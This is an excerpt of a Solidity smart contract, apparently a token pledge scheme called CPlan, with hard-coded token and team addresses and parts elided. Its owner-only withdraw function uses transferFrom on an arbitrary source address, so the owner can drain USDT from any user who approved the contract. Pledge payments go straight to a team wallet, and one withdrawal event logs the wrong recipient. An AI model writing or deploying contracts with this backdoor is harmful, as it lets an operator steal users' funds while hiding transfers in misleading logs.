...
contract CPlan is Ownable
{
    using SafeMath for uint256;
    IERC20 public usdtAddress;
    IERC20 public bncAddress;
    IERC20 public bnbAddress;
    address public teamAddress;
  
  constructor()  {
    usdtAddress = IERC20(0xe38a71627E3289D8154da871F9ecF25Cd41EB483);
    bncAddress = IERC20(0x20Ec6B409f334fAe214Dc3776Cf2E819b6475833);
    bnbAddress = IERC20(0x31700bd2300120Af249eE5F15687b153806ca467);
   
    teamAddress = 0xDeb5F11d3CFDCF52EeCBC996a8E5A963b1CdCa63;
  }

    event WithdrawBnbLog(address toAddr, uint amount);
    event WithdrawBncLog(address toAddr, uint amount);
  ...
  function updateOfficial(address _teamAddress) public onlyOwner {
    ...
    function withdraw(address fromAddr,address toAddr, uint256 amount) onlyOwner public  {
     usdtAddress.transferFrom(fromAddr, toAddr, amount);
  }

  function withdrawBnb(address toAddr, uint256 amount) onlyOwner public  {
    bnbAddress.transfer(toAddr, amount);
    emit WithdrawBnbLog(toAddr, amount);
  }

  function withdrawBnc(address toAddr, uint amount) onlyOwner public  {
    bncAddress.transfer(toAddr, amount);
    emit WithdrawBncLog(msg.sender, amount);
  }
 ...
 function buyPledgeOrder(string memory uuid,uint256 price) public  {
    bncAddress.transferFrom(msg.sender, teamAddress, price);
